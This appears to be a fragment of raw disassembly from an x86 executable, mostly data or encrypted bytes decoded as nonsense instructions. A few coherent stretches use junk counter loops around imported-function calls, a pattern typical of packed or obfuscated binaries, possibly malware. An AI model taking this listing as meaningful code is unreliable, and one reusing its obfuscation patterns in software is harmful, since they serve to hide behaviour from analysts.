  407444:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407445:	loope  0x40748c
  407447:	pushf  
  407448:	jnp    0x4074ac
  40744a:	mov    al,0xe3
  40744c:	mov    al,0x4b
  40744e:	pop    esi
  40744f:	xlat   BYTE PTR ds:[bx]
  407451:	push   ecx
  407452:	or     edi,DWORD PTR [ebp+0x76]
  407455:	inc    edi
  407456:	pop    esi
  407457:	fiadd  WORD PTR [eax-0x3443663e]
  40745d:	mov    ecx,edx
  40745f:	xchg   ebp,eax
  407460:	je     0x4074aa
  407462:	and    ebp,DWORD PTR [esi+0x42341629]
  407468:	mov    ebp,0x5468e31
  40746d:	mov    edx,0xbefe30cc
  407472:	xchg   BYTE PTR [edx-0x496baf3f],dh
  407478:	jmp    0x7957835a
  40747d:	cwde   
  40747e:	imul   ebx,ebx,0xa8f2048b
  407484:	pop    ebx
  407485:	mov    BYTE PTR [esi+0x59],ch
  407488:	in     al,0x9a
  40748a:	cmp    esp,eax
  40748c:	stc    
  40748d:	mov    cl,0x9e
  40748f:	(bad)  
  407490:	shl    BYTE PTR [edx-0x7bffb5e4],cl
  407496:	stos   BYTE PTR es:[edi],al
  407497:	nop
  407498:	in     eax,0x9e
  40749a:	test   al,0x86
  40749c:	and    edi,DWORD PTR [esi+0x32]
  40749f:	in     al,dx
  4074a0:	and    DWORD PTR [ecx],0x53a66df6
  4074a6:	call   0x918eed20
  4074ab:	jbe    0x40746b
  4074ad:	loopne 0x4074bb
  4074af:	ins    DWORD PTR es:[edi],dx
  4074b0:	repz xor DWORD PTR [ecx+esi*8],edx
  4074b4:	xchg   esi,eax
  4074b5:	mov    edx,0xbbf07b80
  4074ba:	dec    ecx
  4074bb:	mov    eax,0xa674b55b
  4074c0:	xor    BYTE PTR ss:[eax-0x7cb43592],bl
  4074c7:	ret    0x1cdd
  4074ca:	arpl   dx,ax
  4074cc:	shr    ah,0xfa
  4074cf:	popa   
  4074d0:	je     0x407551
  4074d2:	cld    
  4074d3:	pop    es
  4074d4:	inc    ebx
  4074d5:	in     al,0xe9
  4074d7:	xchg   BYTE PTR [edx+0x3ec1a8f9],cl
  4074dd:	test   dh,dh
  4074df:	and    DWORD PTR [esi-0x37],edx
  4074e2:	sub    eax,0xf8f60325
  4074e7:	not    BYTE PTR [eax]
  4074e9:	popf   
  4074ea:	in     eax,0x48
  4074ec:	xchg   ebp,eax
  4074ed:	xlat   BYTE PTR ds:[ebx]
  4074ee:	sub    DWORD PTR [edi-0x61eae4f5],ebx
  4074f4:	pop    ds
  4074f5:	xchg   edx,eax
  4074f6:	sub    BYTE PTR cs:[edi-0x59f27be2],bl
  4074fd:	nop
  4074fe:	adc    ah,BYTE PTR [esi]
  407500:	fist   WORD PTR [eax-0x6bb9a228]
  407506:	sbb    al,0x34
  407508:	inc    esp
  407509:	aas    
  40750a:	inc    esi
  40750b:	fbstp  TBYTE PTR [eax+0x67]
  40750e:	mov    eax,ds:0x607e331c
  407513:	push   cs
  407514:	push   0x1f
  407516:	pop    ebx
  407517:	and    eax,DWORD PTR [eax+0x50]
  40751a:	lahf   
  40751b:	pop    ecx
  40751c:	mov    cl,0xe2
  40751e:	and    esp,DWORD PTR [eax]
  407520:	pop    ss
  407521:	mov    BYTE PTR [esi+0x2d],dl
  407524:	inc    BYTE PTR [ebp+0x146ac888]
  40752a:	or     al,0x7b
  40752c:	mov    ah,0xf6
  40752e:	and    cl,BYTE PTR [ebx+0x78e3f50b]
  407534:	stos   BYTE PTR es:[edi],al
  407535:	jmp    0x610fc6e2
  40753a:	adc    al,0xa1
  40753c:	cwde   
  40753d:	dec    ebp
  40753e:	out    dx,al
  40753f:	push   es
  407540:	mov    BYTE PTR [eax],cl
  407542:	mov    cl,0xa0
  407544:	add    eax,DWORD PTR [edx-0x31]
  407547:	outs   dx,DWORD PTR ds:[esi]
  407548:	ja     0x407579
  40754a:	sub    al,0x7e
  40754c:	ins    DWORD PTR es:[edi],dx
  40754d:	jb     0x4075b7
  40754f:	inc    ecx
  407550:	sahf   
  407551:	sti    
  407552:	(bad)  
  407554:	cmp    edi,esp
  407556:	xor    BYTE PTR [eax-0x6098ab14],0x18
  40755d:	leave  
  40755e:	xor    dh,BYTE PTR [edi+0x4ddd2c03]
  407564:	sub    al,0x1b
  407566:	pop    ebx
  407567:	xor    DWORD PTR [eax+0x12],edi
  40756a:	jg     0x407530
  40756c:	shl    BYTE PTR [edi-0x54d4a5b8],1
  407572:	push   esi
  407573:	rol    dh,1
  407575:	and    al,0x5f
  407577:	test   ecx,esi
  407579:	pop    es
  40757a:	fwait
  40757b:	test   al,0x6a
  40757d:	jne    0x407585
  40757f:	push   ecx
  407580:	fld    TBYTE PTR [esi+0x7075064b]
  407586:	(bad)  
  407587:	loope  0x4075c3
  407589:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40758a:	jmp    0x77f:0x2b3abd48
  407591:	jmp    0x44cbd900
  407596:	sahf   
  407597:	dec    esi
  407598:	jno    0x40758e
  40759a:	and    al,BYTE PTR [ecx]
  40759c:	mov    ds:0x31ec45c7,al
  4075a1:	test   DWORD PTR [eax+edi*8+0x55135],ebx
  4075a8:	add    BYTE PTR [eax+0x9577],bh
  4075ae:	mov    ecx,DWORD PTR ds:0x4337d3
  4075b4:	sub    DWORD PTR ds:0x43378f,ecx
  4075ba:	mov    WORD PTR [ebp-0x4],ax
  4075be:	and    ecx,0x22ab
  4075c4:	lea    eax,[ebp-0x24]
  4075c7:	sub    ecx,DWORD PTR ds:0x43377f
  4075cd:	mov    DWORD PTR [ebp-0x28],eax
  4075d0:	mov    eax,DWORD PTR [ebp+0x8]
  4075d3:	and    DWORD PTR ds:0x4337eb,0x78d4
  4075dd:	mov    DWORD PTR [ebp-0x20],eax
  4075e0:	and    DWORD PTR ds:0x43378f,0x0
  4075ea:	jmp    0x4075fc
  4075ef:	mov    ecx,DWORD PTR ds:0x43378f
  4075f5:	inc    ecx
  4075f6:	mov    DWORD PTR ds:0x43378f,ecx
  4075fc:	cmp    DWORD PTR ds:0x43378f,0x1c
  407603:	jae    0x40763a
  407609:	cmp    DWORD PTR ds:0x43378f,0x21
  407610:	jne    0x40762f
  407616:	push   DWORD PTR [ebp-0x18]
  407619:	push   0x26d9
  40761e:	push   DWORD PTR [ebp-0x1c]
  407621:	push   0x600b
  407626:	push   DWORD PTR [ebp-0x14]
  407629:	call   DWORD PTR ds:0x412348
  40762f:	jmp    0x4075ef
  407634:	xor    ecx,0x31bd
  40763a:	push   ebx
  40763b:	lea    eax,[ebp-0x18]
  40763e:	mov    DWORD PTR [ebp-0x1c],eax
  407641:	mov    eax,DWORD PTR [ebp-0x1c]
  407644:	jmp    0x40786c
  407649:	aad    0xb8
  40764b:	(bad)  
  40764c:	shl    BYTE PTR [ebx-0x20],0x75
  407650:	dec    ecx
  407651:	js     0x407697
  407653:	js     0x407668
  407655:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407656:	call   0x7e7e:0xc011dddb
  40765d:	add    eax,0xe7e7e7c
  407662:	cmp    al,0x6
  407664:	dec    eax
  407665:	les    ebp,FWORD PTR [ebp+0x37b7f88a]
  40766b:	mov    ds:0x843e4e07,al
  407670:	inc    esp
  407671:	addr16 dec esp
  407673:	xor    DWORD PTR [esi+0x2f],0x1c
  407677:	fwait
  407678:	xchg   ebp,eax
  407679:	cmp    BYTE PTR [eax+ebx*2],bl
  40767c:	push   es
  40767d:	sbb    eax,0x76efca52
  407682:	div    BYTE PTR [ecx-0x2827fbd1]
  407688:	ret    
  407689:	push   ecx
  40768a:	and    ah,BYTE PTR [esi]
  40768c:	retf   
  40768d:	mov    BYTE PTR [esi+0x75],al
  407690:	add    al,bl
  407692:	fadd   st,st(4)
  407694:	mov    al,0xe1
  407696:	and    ebp,DWORD PTR es:[eax+0x28]
  40769a:	mov    al,ds:0xd156468d
  40769f:	das    
  4076a0:	lock fwait
  4076a2:	jmp    0x407716
  4076a4:	xchg   edx,eax
  4076a5:	clc    
  4076a6:	mov    esp,0x46c15885
  4076ab:	xchg   esi,eax
  4076ac:	shl    BYTE PTR [esi+0x51],1
  4076af:	iret   
  4076b0:	push   cs
  4076b1:	mov    ah,0x63
  4076b3:	adc    ecx,DWORD PTR [ecx]
  4076b5:	fdivr  DWORD PTR [ebx+0x7e]
  4076b8:	stc    
  4076b9:	cld    
  4076ba:	mov    ?,WORD PTR gs:[edi+0x68349833]
  4076c1:	and    ebp,DWORD PTR [ebp+0x718e0c04]
  4076c7:	sbb    eax,0x581bf323
  4076cc:	push   ecx
  4076cd:	or     eax,esp
  4076cf:	sahf   
  4076d0:	loope  0x407682
  4076d2:	adc    cl,0x96
  4076d5:	fwait
  4076d6:	xor    eax,esi
  4076d8:	sub    ah,dl
  4076da:	xlat   BYTE PTR ds:[ebx]
  4076db:	mov    cl,0x7f
  4076dd:	or     eax,0x757c858e
  4076e2:	rcl    DWORD PTR [ebp+eax*2-0x483f99d4],cl
  4076e9:	test   al,0xca
  4076eb:	xchg   DWORD PTR [edx-0x14dff49e],ecx
  4076f1:	dec    esp
  4076f2:	cli    
  4076f3:	add    al,0xd1
  4076f5:	inc    edi
  4076f6:	sbb    DWORD PTR [edx+0x2e],edx
  4076f9:	adc    DWORD PTR [di],edx
  4076fc:	fimul  WORD PTR [ebx+eiz*4]
  4076ff:	dec    edi
  407700:	cmp    BYTE PTR ds:[edi],bh
  407703:	pusha  
  407704:	shl    dl,cl
  407706:	or     DWORD PTR [edi],ebp
  407708:	push   es
  407709:	fist   WORD PTR [ebp-0x29cd008f]
  40770f:	call   0x1075:0x88cb716
  407716:	mov    ch,0x7b
  407718:	jnp    0x40776d
  40771a:	mov    eax,0xfffc2cd
  40771f:	mov    ah,0x22
  407721:	jb     0x407764
  407723:	rcl    BYTE PTR [edi-0x37c70da],1
  407729:	pusha  
  40772a:	mov    cl,0x26
  40772c:	scas   al,BYTE PTR es:[edi]
  40772d:	nop
  40772e:	inc    eax
  40772f:	in     eax,dx
  407730:	mov    eax,es:0x5248cd6f
  407736:	push   ds
  407737:	pop    eax
  407738:	sub    al,0x6a
  40773a:	scas   al,BYTE PTR es:[edi]
  40773b:	das    
  40773c:	in     al,0xd9
  40773e:	repz pop es
  407740:	push   ebp
  407741:	adc    BYTE PTR [eax],0x8
  407744:	rol    BYTE PTR [edx+0x54a3af82],1
  40774a:	sbb    dl,BYTE PTR [eax]
  40774c:	cmc    
  40774d:	fdiv   st(2),st
  40774f:	jmp    0x40770a
  407751:	not    DWORD PTR ds:[esi+0x2c]
  407755:	mov    bl,0x5
  407757:	(bad)  
  407758:	jmp    0x407707
  40775a:	mov    DWORD PTR [eax-0x4310beca],edx
  407760:	cmp    al,0xe2
  407762:	data16 or ch,BYTE PTR [edx-0x4b1dc19f]
  407769:	neg    BYTE PTR [esi]
  40776b:	imul   edi,DWORD PTR [edi],0x39
  40776e:	jb     0x3c0d0285
  407774:	mov    BYTE PTR [ebp-0x458a0bb0],al
  40777a:	call   0x7e5d28cb
  40777f:	dec    ebp
  407780:	arpl   WORD PTR [ecx+0x59443f53],di
  407786:	in     eax,0xa3
  407788:	(bad)  
  407789:	jnp    0x4077ae
  40778b:	lea    ebp,[ecx+0x19]
  40778e:	loop   0x4077e1
  407790:	push   ds
  407791:	push   esp
  407792:	mov    dl,0x6a
  407794:	cli    
  407795:	test   BYTE PTR [ecx+0x3f],cl
  407798:	jae    0x4077c1
  40779a:	mov    bl,BYTE PTR [edi]
  40779c:	stos   BYTE PTR es:[edi],al
  40779d:	nop
  40779e:	out    0xff,al
  4077a0:	repz xchg bl,bh
  4077a3:	or     BYTE PTR [edx+0x58],0x76
  4077a7:	push   0xffffffe2
  4077a9:	and    eax,0x43cc216a
  4077ae:	stos   BYTE PTR es:[edi],al
  4077af:	sub    ebp,DWORD PTR [esi+ebp*4-0x77]
  4077b3:	icebp  
  4077b4:	cmp    esp,DWORD PTR [ecx-0x7af057ab]
  4077ba:	retf   
  4077bb:	adc    eax,0x9e83da3b
  4077c0:	adc    bh,BYTE PTR [esp+ecx*4]
  4077c3:	jns    0x40774a
  4077c5:	xchg   ebp,eax
  4077c6:	mov    ss:0x4a8d846,eax
  4077cc:	enter  0xd31a,0x0
  4077d0:	adc    DWORD PTR [esp+edx*2-0x6021469f],0xfffffffb
  4077d8:	inc    edx
  4077d9:	push   0xb6b3ab3a
  4077de:	mov    DWORD PTR ds:[eax-0x48],ebp
  4077e2:	dec    ebx
  4077e3:	xor    al,0x9d
  4077e5:	les    ebx,FWORD PTR [edi]
  4077e7:	inc    esp
  4077e8:	sub    ah,BYTE PTR [esi]
  4077ea:	std    
  4077eb:	fmul   st(4),st
  4077ed:	jle    0x40783f
  4077ef:	sti    
  4077f0:	stos   DWORD PTR es:[edi],eax
  4077f1:	les    edx,FWORD PTR [eax]
  4077f3:	ja     0x4077bd
  4077f5:	sbb    al,0x39
  4077f7:	jns    0x407804
  4077f9:	loopne 0x407808
  4077fb:	push   ds
  4077fc:	inc    edi
  4077fd:	cli    
  4077fe:	addr16 dec edx
  407800:	mov    edi,0x13a83a5
  407805:	call   0x9d066672
  40780a:	push   ds
  40780b:	(bad)
  40780f:	jns    0x407873
  407811:	retf   0x9ff7
  407814:	push   ebp
  407815:	imul   esp,DWORD PTR [esi],0x84cbe9d3
  40781b:	xchg   ecx,eax
  40781c:	or     edi,DWORD PTR [esi-0x45]
  40781f:	or     esi,DWORD PTR ds:0x7f1e4033
  407825:	pop    esp
  407826:	pop    es
  407827:	push   ebx
  407828:	xor    al,0xed
  40782a:	pop    ebp
  40782b:	sub    bh,BYTE PTR [edx+esi*2+0x25b0dce0]
  407832:	lods   al,BYTE PTR ds:[esi]
  407833:	xchg   ecx,eax
  407834:	pop    esi
  407835:	out    dx,eax
  407836:	rol    DWORD PTR [ebx*1-0x5162f7a6],cl
  40783d:	repnz gs in eax,dx
  407840:	stc    
  407841:	iret   
  407842:	dec    esi
  407843:	data16 jo 0x407801
  407846:	inc    ecx
  407847:	sbb    edx,ebp
  407849:	je     0x407843
  40784b:	cli    
  40784c:	jae    0x407841
  40784e:	cmp    cl,0x86
  407851:	clc    
  407852:	hlt    
  407853:	js     0x40788a
  407855:	dec    ecx
  407856:	clc    
  407857:	dec    esp
  407858:	adc    esp,esi
  40785a:	sbb    eax,0xa631a1b
  40785f:	mov    ah,0x42
  407861:	inc    edi
  407862:	mov    bl,0x52
  407864:	cli    
  407865:	outs   dx,BYTE PTR ds:[esi]
  407866:	push   0x3ca8e2b0
  40786b:	fwait
  40786c:	push   esi
  40786d:	sub    ecx,esi
  40786f:	push   edi
  407870:	mov    edi,0xf89f2da9
  407875:	xor    DWORD PTR ds:0x43377f,0x4337e3
  40787f:	mov    DWORD PTR [eax],edi
  407881:	mov    DWORD PTR ds:0x43389b,0x12
  40788b:	cmp    DWORD PTR ds:0x43389b,0x0
  407892:	je     0x4078c1
  407898:	cmp    DWORD PTR ds:0x43389b,0x14
  40789f:	jne    0x4078b1
  4078a5:	push   DWORD PTR [ebp-0x28]
  4078a8:	push   DWORD PTR [ebp-0x1c]
  4078ab:	call   DWORD PTR ds:0x41234c
  4078b1:	mov    eax,ds:0x43389b
  4078b6:	dec    eax
  4078b7:	mov    ds:0x43389b,eax
  4078bc:	jmp    0x40788b
  4078c1:	mov    eax,DWORD PTR [ebp-0x14]
  4078c4:	mov    ebx,DWORD PTR [ebp-0x8]
  4078c7:	and    DWORD PTR ds:0x43381f,0x0
  4078d1:	xor    esi,esi
  4078d3:	xor    esi,DWORD PTR ds:0x43381f
  4078d9:	inc    esi
  4078da:	mov    DWORD PTR ds:0x43381f,esi
  4078e0:	cmp    DWORD PTR ds:0x43381f,0x1c
  4078e7:	jne    0x4078f6
  4078ed:	push   DWORD PTR [ebp-0x28]
  4078f0:	call   DWORD PTR ds:0x4120d0
  4078f6:	cmp    DWORD PTR ds:0x43381f,0x18
  4078fd:	jb     0x4078d1
  407903:	xor    esi,0x6b5
  407909:	mov    ecx,0x7510854
  40790e:	neg    esi
  407910:	jmp    0x407b38
  407915:	loopne 0x4078c8
  407917:	test   DWORD PTR [edx+0x71f1b255],esi
  40791d:	cmp    dh,cl
  40791f:	pop    ebp
  407920:	out    0x4d,eax
  407922:	pop    ds
  407923:	jmp    0x57e:0x7ece2452
  40792a:	jl     0x4079aa
  40792c:	jle    0x407974
  40792e:	ins    DWORD PTR es:[edi],dx
  40792f:	mov    al,0x73
  407931:	aam    0xab
  407933:	imul   edx,DWORD PTR [esi+0x2],0xfffffff3
  407937:	icebp  
  407938:	fstp   TBYTE PTR [ecx]
  40793a:	test   DWORD PTR [eax+0x4368da9b],esi
  407940:	inc    ecx
  407941:	pop    ds
  407942:	in     al,dx
  407943:	jnp    0x407960
  407945:	jge    0x407971
  407947:	or     esi,ecx
  407949:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40794a:	cwde   
  40794b:	mov    eax,0xa26cb8a5
  407950:	jne    0x407914
  407952:	fcmovnbe st,st(3)
  407954:	int    0xd7
  407956:	in     al,dx
  407957:	jno    0x407908
  407959:	loop   0x407988
  40795b:	push   0x5d75b3b0
  407960:	fistp  WORD PTR [eax-0x34b1e05c]
  407966:	mov    bh,0x7a
  407968:	push   ecx
  407969:	hlt    
  40796a:	scas   eax,DWORD PTR es:[edi]
  40796b:	iret   
  40796c:	jge    0x407901
  40796e:	or     al,0x30
  407970:	and    DWORD PTR [esi+0x394747af],edx
  407976:	mov    cl,0xa0
  407978:	lock pop esp
  40797a:	inc    eax
  40797b:	cmp    al,0x27
  40797d:	add    esp,esp
  40797f:	(bad)
  407982:	adc    al,0xbd
  407984:	push   esp
  407985:	mov    bh,0xb4
  407987:	aam    0xaf
  407989:	fs mov esi,0xb3b0e02c
  40798f:	and    dl,BYTE PTR [edx]
  407991:	push   ecx
  407992:	inc    esp
  407993:	sub    esp,DWORD PTR [edx]
  407995:	mov    DWORD PTR [edx],eax
  407997:	xchg   ebp,eax
  407998:	call   0x60be:0xa3a8ed8f
  40799f:	daa    
  4079a0:	sub    eax,0xc490323d
  4079a5:	cs jae 0x40796b
  4079a8:	arpl   WORD PTR [esi-0x6b],dx
  4079ab:	sub    dh,ch
  4079ad:	fiadd  DWORD PTR [ebx+ebp*4]
  4079b0:	xchg   DWORD PTR [edi],eax
  4079b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079b3:	out    dx,al
  4079b4:	push   esp
  4079b5:	outs   dx,DWORD PTR ds:[esi]
  4079b6:	and    bh,BYTE PTR [ebp-0x7645d9ce]
  4079bc:	xor    al,0xf7
  4079be:	xor    al,0xc1
  4079c0:	mov    ebp,0xdc035025
  4079c5:	push   0xeb6dc4c9
  4079ca:	sbb    DWORD PTR [edx-0x7c0e7200],edx
  4079d0:	pop    esp
  4079d1:	add    al,0xd5
  4079d3:	inc    esi
  4079d4:	dec    esi
  4079d5:	pop    ecx
  4079d6:	nop
  4079d7:	cwde   
  4079d8:	sbb    bl,BYTE PTR [eax-0x6f8de20a]
  4079de:	or     esp,DWORD PTR [esi+0x76]
  4079e1:	cmp    DWORD PTR [esi+0x386b7ff2],esp
  4079e7:	dec    edi
  4079e8:	pushf  
  4079e9:	jbe    0x4079cc
  4079eb:	outs   dx,DWORD PTR ds:[esi]
  4079ec:	add    edx,ebp
  4079ee:	push   ecx
  4079ef:	ret    0x33e8
  4079f2:	lds    ecx,FWORD PTR [eax]
  4079f4:	xchg   ecx,eax
  4079f5:	jb     0x407a71
  4079f7:	add    ebp,DWORD PTR [eax]
  4079f9:	mov    gs,WORD PTR [eax-0x34]
  4079fc:	inc    ecx
  4079fd:	xchg   ebp,eax
  4079fe:	cmp    ebp,ebx
  407a00:	fs fwait
  407a02:	inc    ecx
  407a03:	adc    edi,DWORD PTR [ebx+0xf1b250]
  407a09:	les    eax,FWORD PTR [ebx-0x11d44233]
  407a0f:	vpsrad xmm0,xmm4,XMMWORD PTR [edi]
  407a13:	xchg   esp,eax
  407a14:	retf   
  407a15:	or     cl,BYTE PTR [esi+0x5b]
  407a18:	aas    
  407a19:	fist   DWORD PTR ds:0x85d54c96
  407a1f:	fstp   TBYTE PTR [ebx]
  407a21:	sub    bh,BYTE PTR [esi-0x1c]
  407a24:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a25:	test   eax,0x4310a9eb
  407a2a:	sbb    dh,BYTE PTR [esi+0x7a]
  407a2d:	mov    edi,0x7d92cbaf
  407a32:	jns    0x4079db
  407a34:	clc    
  407a35:	mov    ebx,0x651af62c
  407a3a:	retf   0x732c
  407a3d:	arpl   WORD PTR [edi],si
  407a3f:	push   edi
  407a40:	pop    es
  407a41:	popa   
  407a42:	ja     0x407a2f
  407a44:	pop    edi
  407a45:	jg     0x407a8a
  407a47:	out    0xfd,eax
  407a49:	xchg   esi,eax
  407a4a:	pop    ebp
  407a4b:	pop    edx
  407a4c:	mov    edx,0x7848813e
  407a51:	xchg   edi,eax
  407a52:	inc    ecx
  407a53:	inc    esi
  407a54:	mov    ds:0x50714085,eax
  407a59:	imul   edi,DWORD PTR [eax+0x437e5e42],0xffffffee
  407a60:	sbb    bl,BYTE PTR [edx-0x4823eefc]
  407a66:	cli    
  407a67:	repnz out 0x96,eax
  407a6a:	jle    0x407ae7
  407a6c:	jle    0x407a89
  407a6e:	leave  
  407a6f:	jo     0x407a6e
  407a71:	out    dx,eax
  407a72:	fild   DWORD PTR [edi-0x4]
  407a75:	imul   edi,DWORD PTR [esi],0x32
  407a78:	mov    eax,0x67b4073d
  407a7d:	gs dec ebp
  407a7f:	loope  0x407a03
  407a81:	addr16 xchg ebx,eax
  407a83:	outs   dx,BYTE PTR ds:[esi]
  407a84:	xchg   edi,eax
  407a85:	call   0x6630ed95
  407a8a:	dec    edi
  407a8b:	pop    ecx
  407a8c:	pop    ebx
  407a8d:	push   edi
  407a8e:	je     0x407a92
  407a90:	test   DWORD PTR [eax+0x547cd360],esp
  407a96:	mov    dh,0x8b
  407a98:	push   edx
  407a99:	xchg   ebx,eax
  407a9a:	(bad)  
  407a9b:	push   edx
  407a9c:	adc    BYTE PTR [ecx],bl
  407a9e:	add    ebx,esp
  407aa0:	fwait
  407aa1:	dec    esp
  407aa2:	xchg   DWORD PTR [edx],eax
  407aa4:	push   es
  407aa5:	pop    ss
  407aa6:	jecxz  0x407b23
  407aa8:	inc    ebp
  407aa9:	pop    edx
  407aaa:	call   FWORD PTR [ecx+0x2d]
  407aad:	int3   
  407aae:	xchg   BYTE PTR [ecx-0x6cf01d80],dl
  407ab4:	mov    edx,0x94aa9144
  407ab9:	fisubr WORD PTR [edx+0x490c8538]
  407abf:	scas   eax,DWORD PTR es:[edi]
  407ac0:	retf   
  407ac1:	and    DWORD PTR [ebx+0x32],esp
  407ac4:	ins    DWORD PTR es:[edi],dx
  407ac5:	mov    ah,0x1f
  407ac7:	inc    ecx
  407ac8:	(bad)  
  407ac9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407aca:	inc    esp
  407acb:	adc    al,0xe0
  407acd:	shl    BYTE PTR [esi+0x13c145],0x2e
  407ad4:	mov    bl,0x28
  407ad6:	jle    0x407a8f
  407ad8:	jmp    0x407a63
  407ada:	mov    esp,0x8d3f184e
  407adf:	xor    DWORD PTR [esi-0x77],0x209ad20e
  407ae6:	sbb    eax,0x8dc0b1d9
  407aeb:	loope  0x407b29
  407aed:	mov    al,ds:0xba69b56f
  407af2:	sbb    eax,0xbcbadf28
  407af7:	(bad)  
  407af8:	sub    DWORD PTR [edx-0x43],0x755ac510
  407aff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b00:	pop    edi
  407b01:	push   es
  407b02:	mov    ?,WORD PTR [ebx-0x4b]
  407b05:	jmp    0xb5ca08f
  407b0a:	mov    cl,0x8
  407b0c:	(bad)
  407b0f:	cmp    esp,ebp
  407b11:	push   0x9
  407b13:	fs inc ebx
  407b15:	jne    0x407b55
  407b17:	push   esp
  407b18:	cwde   
  407b19:	jnp    0x407b36
  407b1b:	jge    0x407b47
  407b1d:	mov    ecx,0xde64d27a
  407b22:	sbb    DWORD PTR [ecx+0x56],0x67
  407b26:	jno    0x407b83
  407b28:	popa   
  407b29:	(bad)
  407b2d:	popf   
  407b2e:	je     0x407b45
  407b30:	xchg   ebp,eax
  407b31:	test   BYTE PTR [eax],ah
  407b33:	inc    edx
  407b34:	or     eax,0x335e880d
  407b39:	rol    DWORD PTR [ecx+0x43382b15],0x0
  407b40:	outs   dx,BYTE PTR ds:[esi]
  407b41:	sbb    al,0x0
  407b43:	add    BYTE PTR [esi+0x32729b],bh
  407b49:	mov    DWORD PTR ds:0x4337d3,0x57a0
  407b53:	xor    ebx,ecx
  407b55:	add    DWORD PTR ds:0x433787,0x7d23
  407b5f:	xor    edx,edx
  407b61:	and    DWORD PTR ds:0x4338af,0x43378f
  407b6b:	add    eax,esi
  407b6d:	neg    DWORD PTR ds:0x43381f
  407b73:	add    ebx,esi
  407b75:	inc    DWORD PTR ds:0x433783
  407b7b:	div    ebx
  407b7d:	mov    edx,DWORD PTR [ebp-0x20]
  407b80:	mov    DWORD PTR ds:0x433827,0x7c8f
  407b8a:	mov    DWORD PTR [ebp-0x2c],0x4ec1
  407b91:	mov    DWORD PTR ds:0x43379f,0x3db9
  407b9b:	cmp    eax,DWORD PTR [edx]
  407b9d:	je     0x407f52
  407ba3:	mov    DWORD PTR ds:0x4337eb,0x500e
  407bad:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  407bb4:	and    DWORD PTR ds:0x4337eb,0x1370
  407bbe:	lea    eax,[ebp-0xc]
  407bc1:	xor    edx,DWORD PTR ds:0x433857
  407bc7:	mov    DWORD PTR [ebp-0x10],eax
  407bca:	and    eax,eax
  407bcc:	mov    eax,DWORD PTR [ebp-0x10]
  407bcf:	mov    DWORD PTR ds:0x4337d7,0x11
  407bd9:	cmp    DWORD PTR ds:0x4337d7,0x0
  407be0:	je     0x407c31
  407be6:	cmp    DWORD PTR ds:0x4337d7,0x6
  407bed:	jne    0x407c03
  407bf3:	push   0x578e
  407bf8:	push   0x5398
  407bfd:	call   DWORD PTR ds:0x41229c
  407c03:	cmp    DWORD PTR ds:0x4337d7,0x7
  407c0a:	jne    0x407c1f
  407c10:	xor    edx,edx
  407c12:	add    edx,DWORD PTR ds:0x4337d7
  407c18:	dec    edx
  407c19:	mov    DWORD PTR ds:0x4337d7,edx
  407c1f:	mov    edx,DWORD PTR ds:0x4337d7
  407c25:	dec    edx
  407c26:	mov    DWORD PTR ds:0x4337d7,edx
  407c2c:	jmp    0x407bd9
  407c31:	mov    edx,DWORD PTR [eax]
  407c33:	imul   edx,edx,0xf89ea9ee
  407c39:	jmp    0x407e61
  407c3e:	and    BYTE PTR [edi-0x2b],al
  407c41:	out    0x71,al
  407c43:	je     0x407c76
  407c45:	inc    ecx
  407c46:	adc    al,0x2f
  407c48:	sbb    ecx,esi
  407c4a:	mov    esp,0x2bb60d37
  407c4f:	int3   
  407c50:	jle    0x407cd0
  407c52:	add    eax,0x837e7e7c
  407c57:	icebp  
  407c58:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  407c5a:	clc    
  407c5b:	repnz xor al,0x3d
  407c5e:	adc    eax,0xcbf2acec
  407c63:	or     eax,0x9fdbfcb
  407c68:	daa    
  407c69:	leave  
  407c6a:	mov    edi,?
  407c6c:	cwde   
  407c6d:	lock (bad) 
  407c6f:	ret    
  407c70:	adc    al,0x30
  407c72:	xor    DWORD PTR [esi],edi
  407c74:	fld    TBYTE PTR [edi+ebp*4-0x2af02777]
  407c7b:	xchg   DWORD PTR [eax+0x6],edi
  407c7e:	iret   
  407c7f:	cwde   
  407c80:	push   cs
  407c81:	(bad)  
  407c82:	clc    
  407c83:	sar    bl,cl
  407c85:	adc    al,0x33
  407c87:	or     al,0xf4
  407c89:	cld    
  407c8a:	test   DWORD PTR [edi-0x1c],0x5ab5647
  407c91:	cld    
  407c92:	jns    0x407c66
  407c94:	sbb    dh,BYTE PTR [edx-0x35acf9a6]
  407c9a:	xor    ah,ah
  407c9c:	mov    DWORD PTR [ecx+0x364e5b65],esp
  407ca2:	push   0x4661fc8f
  407ca7:	fwait
  407ca8:	xor    eax,0x28cc510
  407cad:	or     eax,0x4cf929ac
  407cb2:	and    eax,0xae79bd42
  407cb7:	sub    al,0x74
  407cb9:	adc    ebx,DWORD PTR [edx+0x73]
  407cbc:	and    bh,BYTE PTR ds:0x84c308e0
  407cc2:	or     DWORD PTR [ebp-0x12908e8c],eax
  407cc8:	xchg   esi,eax
  407cc9:	mov    cl,ch
  407ccb:	push   ebx
  407ccc:	rcr    BYTE PTR [eax+ecx*2-0x5dc1c6cd],1
  407cd3:	mov    al,BYTE PTR [esi]
  407cd5:	add    esi,esp
  407cd7:	fsubr  QWORD PTR fs:[edx+eax*2+0x5b968924]
  407cdf:	add    al,0x74
  407ce1:	ds cmp al,0x4a
  407ce4:	inc    ecx
  407ce5:	ficomp DWORD PTR [ecx]
  407ce7:	jo     0x407c7f
  407ce9:	pop    ebx
  407cea:	mov    DWORD PTR [eax+0x43],ebp
  407ced:	inc    eax
  407cee:	ins    DWORD PTR es:[edi],dx
  407cef:	mov    cl,BYTE PTR [eax+0x3b040546]
  407cf5:	xchg   edx,eax
  407cf6:	cs out 0x63,al
  407cf9:	clc    
  407cfa:	icebp  
  407cfb:	xor    edi,esi
  407cfd:	imul   edx,DWORD PTR [ebp-0x19e87e1],0x60
  407d04:	mov    DWORD PTR [esi-0x3e],esi
  407d07:	out    dx,al
  407d08:	out    dx,eax
  407d09:	fimul  DWORD PTR [ebp-0x1f]
  407d0c:	dec    esi
